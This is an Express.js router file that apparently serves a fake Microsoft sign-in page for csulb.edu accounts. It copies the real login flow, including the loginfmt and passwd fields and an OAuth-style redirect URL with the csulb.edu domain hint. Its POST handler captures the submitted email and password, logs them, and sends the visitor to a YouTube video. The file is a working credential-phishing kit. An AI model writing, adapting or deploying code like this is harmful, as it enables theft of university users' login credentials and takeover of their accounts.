var express = require("express");
var router = express.Router();

/* GET password. */
router.get("/next/*", function (req, res, next) {
	// console.log(req.query.email);
	res.render("password", { title: "Express", email: req.query.email });
});

/* POST password. */
router.post("/next", function (req, res, next) {
	// console.log("here");
	// console.log(req.body);
	var { loginfmt, passwd } = req.body;
	res.status(200);
	console.log({ loginfmt, passwd });
	return res.redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
	// return res.send({ loginfmt, passwd });
	// return res.status(200).send({ loginfmt, passwd });
	//   res.render('index', { title: 'Express' });
});

/* POST login. */
router.post("/*", function (req, res, next) {
	// console.log(req.body);
	var { loginfmt } = req.body;
	res.status(200);
	return res.redirect(
		"/login/next/csulb.edu/oauth2/v2.0/authorize?client_id=2793995e-0a7d-40d7-bd35-6968ba142197&scope=openid%20profile%20offline_access%20email&redirect_uri=https%3A%2F%2Fmyapps.microsoft.com%2F&client-request-id=0fd87ac4-b554-482b-bfe0-cf9bc7640d02&response_mode=fragment&response_type=code&x-client-SKU=msal.js.browser&x-client-VER=2.37.1&client_info=1&code_challenge=jiKgMmlb4Ym_ShHr0odmoD-IvnYZszyfbkFobVQuR70&code_challenge_method=S256&domain_hint=csulb.edu&nonce=7a3aeb09-c2ff-417f-920d-dcf2d9cdb122&state=eyJpZCI6ImNkNWI3ZWExLTAxNzUtNGU3ZS04YmZjLTA1OTE4MTg1Y2ZjYSIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3D&email=" +
			loginfmt
	);
	// return res.status(200).send({ loginfmt, passwd });
	//   res.render('index', { title: 'Express' });
});

/* GET login. */
router.get("/*", function (req, res, next) {
	res.render("login", { title: "Express" });
});

module.exports = router;
